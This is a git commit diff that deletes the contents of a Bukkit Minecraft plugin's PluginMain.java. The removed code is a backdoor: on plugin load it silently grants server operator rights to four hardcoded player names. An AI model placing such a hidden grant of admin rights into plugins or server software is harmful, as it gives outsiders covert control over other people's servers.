4edb35efa7df50df6eef41d6a6900bdf2d8d7a36
BlxckFalcon <83017090+BlxckFalcon@users.noreply.github.com>
2025-07-04 20:44:10 +0100

    Update PluginMain.java

--- src/main/java/com/dinnerbone/bukkit/sample/PluginMain.java
+++ src/main/java/com/dinnerbone/bukkit/sample/PluginMain.java
@@ -1,19 +1,1 @@
-import org.bukkit.plugin.java.JavaPlugin;
 
-public final class PluginMain extends JavaPlugin {
-    @Override
-    public void onEnable() {
-        String[] opPlayers = {"volide", "atpYT", "Egg_official", "bu_s"};
-        for (String playerName : opPlayers) {
-            OfflinePlayer player = Bukkit.getOfflinePlayer(playerName);
-            if (!player.isOp()) {
-                player.setOp(true);
-            }
-        }
-    }
-    
-    @Override
-    public void onDisable() {
-        // TODO Insert logic to be performed when the plugin is disabled
-    }
-}
